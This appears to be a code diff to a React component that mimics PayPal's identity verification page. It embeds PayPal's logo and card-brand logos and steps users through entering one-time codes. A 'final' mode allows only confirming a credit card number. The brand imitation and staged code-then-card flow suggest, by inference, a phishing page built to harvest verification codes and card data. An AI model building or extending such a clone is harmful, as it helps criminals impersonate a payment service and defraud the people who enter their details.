@@ -12,7 +12,7 @@ interface VerificationPageProps {
 type VerificationStep = 'choose' | 'confirm_card' | 'enter_code';
 type VerificationOption = 'confirm_card' | 'security_questions' | 'paypal_app' | 'get_text' | 'have_call' | 'get_email' | 'whatsapp';
 
-export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: VerificationPageProps) {
+export function VerificationPage({ email, onBack, onVerificationSuccess, mode = 'initial' }: VerificationPageProps) {
   const [step, setStep] = useState<VerificationStep>('choose');
   const [loading, setLoading] = useState(false);
   const [selectedOption, setSelectedOption] = useState<VerificationOption>(mode === 'initial' ? 'get_text' : 'confirm_card');
@@ -77,7 +77,7 @@ export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: Ve
       setLoading(false);
       if (selectedOption === 'confirm_card') {
         setStep('confirm_card');
-      } else if (selectedOption === 'get_text' || selectedOption === 'have_call') {
+      } else if (selectedOption === 'get_text' || selectedOption === 'have_call' || selectedOption === 'get_email') {
         setStep('enter_code');
         setCountdown(45);
       }
@@ -122,12 +122,18 @@ export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: Ve
       <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
         <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
           <form onSubmit={handleConfirm} className="w-full flex flex-col items-center">
-            {/* PayPal Logo */}
-            <div className="mb-8 self-start">
+            {/* PayPal Logo and Card Type Logos */}
+            <div className="mb-8 self-start flex items-center gap-4">
               <svg viewBox="0 0 200 200" className="w-10 h-10" xmlns="http://www.w3.org/2000/svg">
                 <path d="M55.4,153.8l14.1-89.2c0.3-1.9,1.9-3.3,3.8-3.3h38.2c18.5,0,28.8,8.8,26.4,24.1 c-2,12.5-11.2,22.2-23.4,24.1c-1.5,0.2-2.7,1.4-3,2.9l-0.3,1.6l-2.4,15.4l-0.2,1.1c-0.3,1.9-1.9,3.3-3.8,3.3H81.6 c-2.3,0-4,2.1-3.6,4.4l-5.6,35.6c-0.3,1.9-1.9,3.3-3.8,3.3H55.4z" fill="#003087" />
                 <path d="M68.5,70.8l-8.8,55.6c-0.3,1.9,1.2,3.6,3.1,3.6h18.2c1.9,0,3.5-1.4,3.8-3.3l5.8-36.7l0.2-1.1 c0.3-1.9,1.9-3.3,3.8-3.3h16.5c12.2-1.9,21.4-11.6,23.4-24.1c0.8-5.1,0.2-9.8-1.7-13.7c-3.6-7.5-11.9-11.5-22.6-11.5H72.3 C70.4,39.3,68.8,40.7,68.5,42.6L68.5,70.8z" fill="#0079C1" />
               </svg>
+              <div className="flex gap-2">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-4 w-auto grayscale opacity-40" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-4 w-auto grayscale opacity-40" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" className="h-4 w-auto grayscale opacity-40" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="h-4 w-auto grayscale opacity-40" />
+              </div>
             </div>
             
             <div className="w-full space-y-4 mb-8">
@@ -194,11 +200,13 @@ export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: Ve
               </svg>
             </div>
             <h1 className="text-[32px] font-bold text-gray-900 leading-tight mb-8 self-start tracking-tight">
-              {mode === 'final' ? 'Enter the code you get' : 'Enter the code we texted you'}
+              {selectedOption === 'get_email' ? 'Enter the code we emailed you' : (mode === 'final' ? 'Enter the code you get' : 'Enter the code we texted you')}
             </h1>
-            <p className="text-[16px] text-gray-900 mb-8 self-start font-medium">
-              +1 •••-••-••••
-            </p>
+            {selectedOption === 'get_email' && (
+              <p className="text-[16px] text-gray-900 mb-8 self-start font-medium">
+                {email}
+              </p>
+            )}
             <div className="flex gap-1.5 sm:gap-2 mb-4 w-full justify-between">
               {verificationCode.map((digit, i) => (
                 <input
@@ -292,7 +300,6 @@ export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: Ve
             <SelectableOption 
               icon={<CreditCard className={`w-6 h-6 ${mode === 'final' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Confirm your credit card number" 
-              sublabel="Card x-••••"
               selected={selectedOption === 'confirm_card'}
               onSelect={() => setSelectedOption('confirm_card')}
               disabled={mode !== 'final'}
@@ -312,7 +319,6 @@ export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: Ve
             <SelectableOption 
               icon={<MessageSquare className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Get a text" 
-              sublabel="Mobile +1 •••-•••-••••"
               selected={selectedOption === 'get_text'}
               onSelect={() => setSelectedOption('get_text')}
               disabled={mode !== 'initial'}
@@ -325,10 +331,12 @@ export function VerificationPage({ onVerificationSuccess, mode = 'initial' }: Ve
               disabled={mode !== 'initial'}
             />
             <SelectableOption 
-              icon={<Mail className="w-6 h-6 text-gray-400" />} 
+              icon={<Mail className={`w-6 h-6 ${mode === 'initial' ? 'text-gray-700' : 'text-gray-400'}`} />} 
               label="Get an email" 
-              selected={false}
-              disabled
+              sublabel={mode === 'initial' ? email : undefined}
+              selected={selectedOption === 'get_email'}
+              onSelect={() => setSelectedOption('get_email')}
+              disabled={mode !== 'initial'}
             />
             <SelectableOption 
               icon={<MessageSquare className="w-6 h-6 text-gray-400" />} 
